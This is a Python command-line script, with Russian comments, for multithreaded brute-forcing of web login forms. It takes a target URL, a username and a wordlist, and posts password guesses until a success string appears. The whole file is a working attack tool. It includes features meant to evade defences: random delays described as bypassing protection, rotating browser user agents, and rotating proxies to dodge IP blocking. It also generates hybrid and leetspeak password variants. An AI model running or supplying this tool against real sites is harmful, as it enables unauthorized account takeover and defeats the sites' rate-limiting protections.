import requests
import argparse
import time
import random
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

def try_password(args):
	url, username, password, success_indicator, failure_indicator, proxy = args
	proxies = None
	if proxy:
		proxies = {"http": proxy, "https": proxy}
	data = {"username": username, "password": password}
	try:
		# Добавляем случайную задержку для обхода защиты
		time.sleep(random.uniform(0.1, 0.5))
		# Имитируем разные браузеры
		user_agents = [
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
		]
		headers = {"User-Agent": random.choice(user_agents)}
		response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=5)
		if success_indicator in response.text:
			return password, True
		elif failure_indicator and failure_indicator not in response.text:
			return password, "maybe"
		return password, False
	except requests.RequestException:
		return password, False

def brute_force(url, username, password_list, success_indicator, failure_indicator=None, max_workers=10, proxy_list=None):
	print(f"Начинаем многопоточный брутфорс для пользователя: {username}")
	print(f"Количество паролей для проверки: {len(password_list)}")
	proxies = []
	if proxy_list:
		with open(proxy_list, 'r') as f:
			proxies = [line.strip() for line in f if line.strip()]
		print(f"Загружено {len(proxies)} прокси")
	with ThreadPoolExecutor(max_workers=max_workers) as executor:
		tasks = []
		for password in password_list:
			proxy = random.choice(proxies) if proxies else None
			tasks.append((url, username, password, success_indicator, failure_indicator, proxy))
		results = list(tqdm(executor.map(try_password, tasks), total=len(tasks), desc="Прогресс"))
	for password, status in results:
		if status is True:
			print(f"\n[+] Пароль найден: {password}")
			return password
		elif status == "maybe":
			print(f"\n[?] Возможный пароль (необычный ответ): {password}")
	print("\n[-] Пароль не найден")
	return None

def load_passwords(file_path):
	try:
		with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
			return [line.strip() for line in file if line.strip()]
	except FileNotFoundError:
		print(f"[-] Файл {file_path} не найден")
		return []
	except Exception as e:
		print(f"[-] Ошибка при чтении файла: {e}")
		return []

def generate_hybrid_passwords(base_passwords, num_digits=3):
	"""Создает гибридные пароли, добавляя цифры к базовым паролям"""
	hybrid_passwords = []
	for base in base_passwords:
		# Добавляем оригинальный пароль
		hybrid_passwords.append(base)
		# Добавляем цифры в конец
		for i in range(10**num_digits):
			# Форматируем число с ведущими нулями
			suffix = str(i).zfill(num_digits)
			hybrid_passwords.append(f"{base}{suffix}")
		# Вариации с заменой букв на цифры (leetspeak)
		if 'a' in base.lower():
			hybrid_passwords.append(base.lower().replace('a', '4'))
		if 'e' in base.lower():
			hybrid_passwords.append(base.lower().replace('e', '3'))
		if 'i' in base.lower():
			hybrid_passwords.append(base.lower().replace('i', '1'))
		if 'o' in base.lower():
			hybrid_passwords.append(base.lower().replace('o', '0'))
	return hybrid_passwords

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Многопоточный брутфорс-скрипт для веб-форм")
	parser.add_argument("-u", "--url", required=True, help="URL целевой формы логина")
	parser.add_argument("-n", "--username", required=True, help="Имя пользователя для брутфорса")
	parser.add_argument("-p", "--passwords", required=True, help="Путь к файлу со списком паролей")
	parser.add_argument("-s", "--success", required=True, help="Текст, указывающий на успешный вход")
	parser.add_argument("-f", "--failure", help="Текст, указывающий на неудачный вход")
	parser.add_argument("-w", "--workers", type=int, default=10, help="Количество рабочих потоков")
	parser.add_argument("-x", "--proxy", help="Файл со списком прокси")
	parser.add_argument("--hybrid", action="store_true", help="Использовать гибридную атаку")
	args = parser.parse_args()
	passwords = load_passwords(args.passwords)
	if args.hybrid:
		print("Генерация гибридных паролей...")
		passwords = generate_hybrid_passwords(passwords[:100])  # Ограничиваем для примера
		print(f"Создано {len(passwords)} гибридных паролей")
	if passwords:
		found_password = brute_force(args.url, args.username, passwords, args.success, args.failure, args.workers, args.proxy)

